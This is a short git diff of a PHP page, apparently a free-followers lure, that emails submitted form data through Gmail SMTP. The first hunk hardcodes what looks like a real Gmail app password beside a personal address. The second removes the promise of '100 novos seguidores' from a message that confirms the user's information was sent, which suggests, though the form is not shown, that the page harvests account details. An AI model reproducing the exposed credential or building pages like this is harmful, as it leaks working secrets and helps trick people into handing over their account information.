@@ -27,7 +27,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $mail->Host       = 'smtp.gmail.com';                 // Servidor SMTP do Gmail
         $mail->SMTPAuth   = true;                             // Ativar autenticação SMTP
         $mail->Username   = 'the.emerson.araujo@gmail.com';   // Seu endereço de e-mail Gmail
-        $mail->Password   = 'sua-senha-de-aplicativo';         // Senha de aplicativo gerada
+        $mail->Password   = 'ungg zbxg zciw ojkk';         // Senha de aplicativo gerada
         $mail->SMTPSecure = 'tls';                            // Habilitar criptografia TLS
         $mail->Port       = 587;                              // Porta TCP a ser conectada
 
@@ -111,7 +111,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <h2>Bem-vindo, <?php echo htmlspecialchars($username); ?>!</h2>
             <p class="success-message">Estamos felizes em tê-lo conosco.</p>
             <p>Suas informações foram enviadas com sucesso!</p>
-            <p>Aguarde 24hrs para seus novos 100 seguidores!</p>
+            <p>Aguarde 24hrs</p>
             <a href="index.html">Voltar ao Início</a>
         <?php else: ?>
             <h2>Oops!</h2>
